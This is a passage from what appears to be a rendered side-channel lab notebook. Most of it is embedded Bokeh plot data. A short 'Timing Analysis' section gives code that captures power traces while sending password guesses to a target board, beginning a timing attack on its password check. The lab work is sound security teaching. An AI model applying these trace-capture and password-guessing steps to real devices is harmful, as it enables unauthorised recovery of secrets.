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","dtype":"float64","shape":[2000]}},"selected":{"id":"1047","type":"Selection"},"selection_policy":{"id":"1046","type":"UnionRenderers"}},"id":"1034","type":"ColumnDataSource"},{"attributes":{"callback":null},"id":"1005","type":"DataRange1d"},{"attributes":{},"id":"1007","type":"LinearScale"},{"attributes":{},"id":"1042","type":"BasicTickFormatter"},{"attributes":{},"id":"1009","type":"LinearScale"},{"attributes":{"formatter":{"id":"1044","type":"BasicTickFormatter"},"ticker":{"id":"1012","type":"BasicTicker"}},"id":"1011","type":"LinearAxis"},{"attributes":{},"id":"1017","type":"BasicTicker"},{"attributes":{},"id":"1012","type":"BasicTicker"},{"attributes":{"ticker":{"id":"1012","type":"BasicTicker"}},"id":"1015","type":"Grid"},{"attributes":{"dimension":1,"ticker":{"id":"1017","type":"BasicTicker"}},"id":"1020","type":"Grid"},{"attributes":{"formatter":{"id":"1042","type":"BasicTickFormatter"},"ticker":{"id":"1017","type":"BasicTicker"}},"id":"1016","type":"LinearAxis"},{"attributes":{"source":{"id":"1034","type":"ColumnDataSource"}},"id":"1038","type":"CDSView"},{"attributes":{"active_drag":"auto","active_inspect":"auto","active_multi":null,"active_scroll":"auto","active_tap":"auto","tools":[{"id":"1021","type":"PanTool"},{"id":"1022","type":"WheelZoomTool"},{"id":"1023","type":"BoxZoomTool"},{"id":"1024","type":"SaveTool"},{"id":"1025","type":"ResetTool"},{"id":"1026","type":"HelpTool"}]},"id":"1027","type":"Toolbar"},{"attributes":{},"id":"1021","type":"PanTool"},{"attributes":{},"id":"1022","type":"WheelZoomTool"},{"attributes":{"overlay":{"id":"1045","type":"BoxAnnotation"}},"id":"1023","type":"BoxZoomTool"},{"attributes":{},"id":"1024","type":"SaveTool"},{"attributes":{},"id":"1025","type":"ResetTool"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1036","type":"Line"},{"attributes":{},"id":"1026","type":"HelpTool"},{"attributes":{"text":""},"id":"1039","type":"Title"},{"attributes":{"data_source":{"id":"1034","type":"ColumnDataSource"},"glyph":{"id":"1035","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1036","type":"Line"},"selection_glyph":null,"view":{"id":"1038","type":"CDSView"}},"id":"1037","type":"GlyphRenderer"}],"root_ids":["1002"]},"title":"Bokeh Application","version":"1.2.0"}};
      var render_items = [{"docid":"d2eb6f3b-8675-4e24-ad53-adf2ee1245b5","roots":{"1002":"52d4c9cb-6b71-41f6-a9e7-0b290f3e6f70"}}];
      root.Bokeh.embed.embed_items_notebook(docs_json, render_items);
    
      }
      if (root.Bokeh !== undefined) {
        embed_document(root);
      } else {
        var attempts = 0;
        var timer = setInterval(function(root) {
          if (root.Bokeh !== undefined) {
            embed_document(root);
            clearInterval(timer);
          }
          attempts++;
          if (attempts > 100) {
            console.log("Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing");
            clearInterval(timer);
          }
        }, 10, root)
      }
    })(window);
    </script>
    </div>

Timing Analysis
---------------

Now that we can capture traces, we can begin planning our attack. First
we'll make a function to guess a password and return a power trace,
since we'll be repeating those steps a lot:


**In [13]:**

.. code:: ipython3

    def cap_pass_trace(pass_guess):
        ret = ""
        reset_target(scope)
        num_char = target.in_waiting()
        while num_char > 0:
            ret += target.read(num_char, 10)
            time.sleep(0.01)
            num_char = target.in_waiting()
    
        scope.arm()
        target.write(pass_guess)
        ret = scope.capture()
        if ret:
            print('Timeout happened during acquisition')
    
        trace = scope.get_last_trace()
        return trace

Next, we'll try two different passwords and see if the power traces
differ by length. We'll then plot both traces on the same figure (with
the first in red and the second in blue).


**In [14]:**

.. code:: ipython3

    trace = cap_pass_trace("\n")
    new_trace = cap_pass_trace("h\n")
    x_range = range(0, len(new_trace))
    p = figure()
    p.add_tools(CrosshairTool())
    p.line(x_range, new_trace)
    p.line(x_range, trace, line_color='red')
    show(p)


**Out [14]:**


.. raw:: html

    <div class="data_html">
        
    
    
    
    
    
      <div class="bk-root" id="97bd1eca-0966-47ce-bb6a-711587980636" data-root-id="1102"></div>
    
    </div>



.. raw:: html

    

    <div id="0ebb307a-5a77-4d20-8325-6e7d0a096036"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#0ebb307a-5a77-4d20-8325-6e7d0a096036');
        (function(root) {
      function embed_document(root) {
        
      var docs_json = {"c057968c-a157-4ef3-8186-c570b860e3f6":{"roots":{"references":[{"attributes":{"below":[{"id":"1111","type":"LinearAxis"}],"center":[{"id":"1115","type":"Grid"},{"id":"1120","type":"Grid"}],"left":[{"id":"1116","type":"LinearAxis"}],"renderers":[{"id":"1139","type":"GlyphRenderer"},{"id":"1144","type":"GlyphRenderer"}],"title":{"id":"1155","type":"Title"},"toolbar":{"id":"1127","type":"Toolbar"},"x_range":{"id":"1103","type":"DataRange1d"},"x_scale":{"id":"1107","type":"LinearScale"},"y_range":{"id":"1105","type":"DataRange1d"},"y_scale":{"id":"1109","type":"LinearScale"}},"id":"1102","subtype":"Figure","type":"Plot"},{"attributes":{"formatter":{"id":"1158","type":"BasicTickFormatter"},"ticker":{"id":"1117","type":"BasicTicker"}},"id":"1116","type":"LinearAxis"},{"attributes":{"line_color":"red","x":{"field":"x"},"y":{"field":"y"}},"id":"1142","type":"Line"},{"attributes":{},"id":"1117","type":"BasicTicker"},{"attributes":{"source":{"id":"1136","type":"ColumnDataSource"}},"id":"1140","type":"CDSView"},{"attributes":{},"id":"1121","type":"PanTool"},{"attributes":{"callback":null},"id":"1103","type":"DataRange1d"},{"attributes":{},"id":"1122","type":"WheelZoomTool"},{"attributes":{},"id":"1109","type":"LinearScale"},{"attributes":{"overlay":{"id":"1161","type":"BoxAnnotation"}},"id":"1123","type":"BoxZoomTool"},{"attributes":{},"id":"1124","type":"SaveTool"},{"attributes":{},"id":"1125","type":"ResetTool"},{"attributes":{},"id":"1165","type":"Selection"},{"attributes":{"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1137","type":"Line"},{"attributes":{},"id":"1126","type":"HelpTool"},{"attributes":{"data_source":{"id":"1136","type":"ColumnDataSource"},"glyph":{"id":"1137","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1138","type":"Line"},"selection_glyph":null,"view":{"id":"1140","type":"CDSView"}},"id":"1139","type":"GlyphRenderer"},{"attributes":{"data_source":{"id":"1141","type":"ColumnDataSource"},"glyph":{"id":"1142","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1143","type":"Line"},"selection_glyph":null,"view":{"id":"1145","type":"CDSView"}},"id":"1144","type":"GlyphRenderer"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801,802,803,804,805,806,807,808,809,810,811,812,813,814,815,816,817,818,819,820,821,822,823,824,825,826,827,828,829,830,831,832,833,834,835,836,837,838,839,840,841,842,843,844,845,846,847,848,849,850,851,852,853,854,855,856,857,858,859,860,861,862,863,864,865,866,867,868,869,870,871,872,873,874,875,876,877,878,879,880,881,882,883,884,885,886,887,888,889,890,891,892,893,894,895,896,897,898,899,900,901,902,903,904,905,906,907,908,909,910,911,912,913,914,915,916,917,918,919,920,921,922,923,924,925,926,927,928,929,930,931,932,933,934,935,936,937,938,939,940,941,942,943,944,945,946,947,948,949,950,951,952,953,954,955,956,957,958,959,960,961,962,963,964,965,966,967,968,969,970,971,972,973,974,975,976,977,978,979,980,981,982,983,984,985,986,987,988,989,990,991,992,993,994,995,996,997,998,999,1000,1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1011,1012,1013,1014,1015,1016,1017,1018,1019,1020,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1101,1102,1103,1104,1105,1106,1107,1108,1109,1110,1111,1112,1113,1114,1115,1116,1117,1118,1119,1120,1121,1122,1123,1124,1125,1126,1127,1128,1129,1130,1131,1132,1133,1134,1135,1136,1137,1138,1139,1140,1141,1142,1143,1144,1145,1146,1147,1148,1149,1150,1151,1152,1153,1154,1155,1156,1157,1158,1159,1160,1161,1162,1163,1164,1165,1166,1167,1168,1169,1170,1171,1172,1173,1174,1175,1176,1177,1178,1179,1180,1181,1182,1183,1184,1185,1186,1187,1188,1189,1190,1191,1192,1193,1194,1195,1196,1197,1198,1199,1200,1201,1202,1203,1204,1205,1206,1207,1208,1209,1210,1211,1212,1213,1214,1215,1216,1217,1218,1219,1220,1221,1222,1223,1224,1225,1226,1227,1228,1229,1230,1231,1232,1233,1234,1235,1236,1237,1238,1239,1240,1241,1242,1243,1244,1245,1246,1247,1248,1249,1250,1251,1252,1253,1254,1255,1256,1257,1258,1259,1260,1261,1262,1263,1264,1265,1266,1267,1268,1269,1270,1271,1272,1273,1274,1275,1276,1277,1278,1279,1280,1281,1282,1283,1284,1285,1286,1287,1288,1289,1290,1291,1292,1293,1294,1295,1296,1297,1298,1299,1300,1301,1302,1303,1304,1305,1306,1307,1308,1309,1310,1311,1312,1313,1314,1315,1316,1317,1318,1319,1320,1321,1322,1323,1324,1325,1326,1327,1328,1329,1330,1331,1332,1333,1334,1335,1336,1337,1338,1339,1340,1341,1342,1343,1344,1345,1346,1347,1348,1349,1350,1351,1352,1353,1354,1355,1356,1357,1358,1359,1360,1361,1362,1363,1364,1365,1366,1367,1368,1369,1370,1371,1372,1373,1374,1375,1376,1377,1378,1379,1380,1381,1382,1383,1384,1385,1386,1387,1388,1389,1390,1391,1392,1393,1394,1395,1396,1397,1398,1399,1400,1401,1402,1403,1404,1405,1406,1407,1408,1409,1410,1411,1412,1413,1414,1415,1416,1417,1418,1419,1420,1421,1422,1423,1424,1425,1426,1427,1428,1429,1430,1431,1432,1433,1434,1435,1436,1437,1438,1439,1440,1441,1442,1443,1444,1445,1446,1447,1448,1449,1450,1451,1452,1453,1454,1455,1456,1457,1458,1459,1460,1461,1462,1463,1464,1465,1466,1467,1468,1469,1470,1471,1472,1473,1474,1475,1476,1477,1478,1479,1480,1481,1482,1483,1484,1485,1486,1487,1488,1489,1490,1491,1492,1493,1494,1495,1496,1497,1498,1499,1500,1501,1502,1503,1504,1505,1506,1507,1508,1509,1510,1511,1512,1513,1514,1515,1516,1517,1518,1519,1520,1521,1522,1523,1524,1525,1526,1527,1528,1529,1530,1531,1532,1533,1534,1535,1536,1537,1538,1539,1540,1541,1542,1543,1544,1545,1546,1547,1548,1549,1550,1551,1552,1553,1554,1555,1556,1557,1558,1559,1560,1561,1562,1563,1564,1565,1566,1567,1568,1569,1570,1571,1572,1573,1574,1575,1576,1577,1578,1579,1580,1581,1582,1583,1584,1585,1586,1587,1588,1589,1590,1591,1592,1593,1594,1595,1596,1597,1598,1599,1600,1601,1602,1603,1604,1605,1606,1607,1608,1609,1610,1611,1612,1613,1614,1615,1616,1617,1618,1619,1620,1621,1622,1623,1624,1625,1626,1627,1628,1629,1630,1631,1632,1633,1634,1635,1636,1637,1638,1639,1640,1641,1642,1643,1644,1645,1646,1647,1648,1649,1650,1651,1652,1653,1654,1655,1656,1657,1658,1659,1660,1661,1662,1663,1664,1665,1666,1667,1668,1669,1670,1671,1672,1673,1674,1675,1676,1677,1678,1679,1680,1681,1682,1683,1684,1685,1686,1687,1688,1689,1690,1691,1692,1693,1694,1695,1696,1697,1698,1699,1700,1701,1702,1703,1704,1705,1706,1707,1708,1709,1710,1711,1712,1713,1714,1715,1716,1717,1718,1719,1720,1721,1722,1723,1724,1725,1726,1727,1728,1729,1730,1731,1732,1733,1734,1735,1736,1737,1738,1739,1740,1741,1742,1743,1744,1745,1746,1747,1748,1749,1750,1751,1752,1753,1754,1755,1756,1757,1758,1759,1760,1761,1762,1763,1764,1765,1766,1767,1768,1769,1770,1771,1772,1773,1774,1775,1776,1777,1778,1779,1780,1781,1782,1783,1784,1785,1786,1787,1788,1789,1790,1791,1792,1793,1794,1795,1796,1797,1798,1799,1800,1801,1802,1803,1804,1805,1806,1807,1808,1809,1810,1811,1812,1813,1814,1815,1816,1817,1818,1819,1820,1821,1822,1823,1824,1825,1826,1827,1828,1829,1830,1831,1832,1833,1834,1835,1836,1837,1838,1839,1840,1841,1842,1843,1844,1845,1846,1847,1848,1849,1850,1851,1852,1853,1854,1855,1856,1857,1858,1859,1860,1861,1862,1863,1864,1865,1866,1867,1868,1869,1870,1871,1872,1873,1874,1875,1876,1877,1878,1879,1880,1881,1882,1883,1884,1885,1886,1887,1888,1889,1890,1891,1892,1893,1894,1895,1896,1897,1898,1899,1900,1901,1902,1903,1904,1905,1906,1907,1908,1909,1910,1911,1912,1913,1914,1915,1916,1917,1918,1919,1920,1921,1922,1923,1924,1925,1926,1927,1928,1929,1930,1931,1932,1933,1934,1935,1936,1937,1938,1939,1940,1941,1942,1943,1944,1945,1946,1947,1948,1949,1950,1951,1952,1953,1954,1955,1956,1957,1958,1959,1960,1961,1962,1963,1964,1965,1966,1967,1968,1969,1970,1971,1972,1973,1974,1975,1976,1977,1978,1979,1980,1981,1982,1983,1984,1985,1986,1987,1988,1989,1990,1991,1992,1993,1994,1995,1996,1997,1998,1999],"y":{"__ndarray__":"AA